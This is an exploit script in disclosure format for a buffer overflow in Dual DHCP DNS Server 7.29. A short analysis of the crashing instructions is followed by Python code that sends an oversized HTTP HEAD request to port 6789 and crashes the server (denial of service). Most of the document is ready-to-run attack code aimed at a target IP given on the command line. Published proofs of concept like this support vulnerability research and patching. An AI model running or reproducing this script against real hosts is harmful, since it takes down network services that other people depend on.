# Title :  Dual DHCP DNS Server 7.29 Buffer Overflow (Dos)
# Date : 07/12/2016
# Author : R-73eN
# Tested on: Dual DHCP DNS Server 7.29 on Windows 7 SP1 (32bit)
# Vendor : http://dhcp-dns-server.sourceforge.net/
# Software : https://sourceforge.net/projects/dhcp-dns-server/files/Dual%20DHCP%20DNS%20Server/DualServerInstallerV7.29.exe/download
# Vulnerability Description:
# The software crashes when it tries to write to an invalid address.
#
# MOV EBX,DWORD PTR SS:[EBP+8] -> EBP+8 is part of our controlled input
# MOV DWORD PTR SS:[ESP+4],31              
# MOV DWORD PTR SS:[ESP],1 
# .........................
# MOV DWORD PTR DS:[EBX+24],EAX -> Here happens the corruption, EAX fails to move EBX which is our controlled adress + 24 bytes.
#
# I think this vulnerability is not exploitable because every module that is loaded has ASLR/DEP/SAFESEH enabled (Win 7)
# Even if we try to put some valid pointers to manipulate the execution flow we can't because every address on the DualServ.exe 
# contains 00 which is a badchar in our case.
#

import socket
import time
import sys

banner = "\n\n"
banner +="  ___        __        ____                 _    _  \n" 
banner +=" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n"
banner +="  | || '_ \| |_ / _ \| |  _ / _ \ '_ \    / _ \ | |    \n"
banner +="  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n"
banner +=" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n"
print banner

host = ""
port = 6789

def send_request(host,port,data):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((host,port))
		s.send(data)
		print "[+] Malicious Packet Sent [+]\n"
		
	except Exception:
		print "[+] Exploit failed . . .[+]\n"
	s.close()

	

ebx = "BBBB"
eax = "CCCC"
evil = "A" * 497 + eax + "AAAA" + ebx + "D" * 400

if(len(sys.argv) < 1):
    print '\n Usage : exploit.py ipaddress\n'
    exit(0)
else:
    host = sys.argv[1]

#The method doesn't really matters. It gets valideted only about the length
request = "HEAD /{REPLACE} HTTP/1.1\r\nHost: " + str(host) + "\r\nUser-agent: Fuzzer\r\n\r\n"
send_request(host,port,request.replace("{REPLACE}",evil))